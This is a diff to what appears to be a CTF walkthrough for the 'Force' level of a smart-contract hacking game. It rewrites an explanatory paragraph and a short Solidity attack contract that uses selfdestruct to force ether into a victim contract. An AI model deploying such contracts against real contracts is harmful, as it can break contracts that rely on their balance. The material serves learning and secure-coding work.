@@ -88,19 +88,13 @@ await contract.sendTransaction({
 ```
 
 ## 7. Force
-Even though your contract may not have a payable fallback function, you can still force ether transfers into your contract via selfdestruct or transaction fee rewards for mining a block. Do not ever assume that your contract will always have 0 balance and use it as part of validation.
+You can easily forcibly send ether to a contract. Read [this](https://consensys.github.io/smart-contract-best-practices/known_attacks/#forcibly-sending-ether-to-a-contract) to learn more.
 ```
-pragma solidity ^0.4.24;
+pragma solidity ^0.6.0;
 
-contract hackIt {
+contract AttackForce {
     
-    address private _victim;
-    
-    constructor(address victim) public payable {
-        _victim = victim;
-    }
-    
-    function forceTransfer() public {
+    constructor(address payable _victim) public payable {
         selfdestruct(_victim);
     }
 }
